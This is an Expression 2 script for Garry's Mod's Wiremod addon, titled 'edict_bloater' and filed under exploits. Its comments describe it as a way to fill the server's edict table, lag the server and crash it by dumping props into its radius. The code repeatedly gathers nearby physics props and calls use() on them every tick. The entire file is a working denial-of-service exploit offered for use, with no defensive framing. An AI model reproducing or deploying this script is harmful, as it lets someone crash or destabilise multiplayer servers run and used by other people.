@name exploits/edict_bloater
@persist Lol:array

# Created by Fasteroid and inspired by noooooo's "armor succ"
# fills the edict stupid fast and can easily lag/crash the server

# place some small props near the chip power up the exploit
# once the server lags, it will remain unstable even after chip removal
# to crash the server, dump a bathtub of cans into the sphere of effect

if(first()){
    
    runOnTick(1)
    timer("find",250)
    
    holoCreate(1)
    holoParent(1,entity())
    holoModel(1,"hq_icosphere")
    holoScaleUnits(1,vec(-200))
    holoMaterial(1,"lights/white")
    holoAlpha(1,50)
    
}

if(clk("find")){
    findIncludeClass("prop_physics")
    findInSphere(entity():pos(),100)
    Lol = findToArray()    
    timer("find",250)
}

foreach(K,V:entity=Lol){
    V:setMass(5)
    V:use()
}


holoColor(1,hsv2rgb((curtime()*100)%360,1,1))

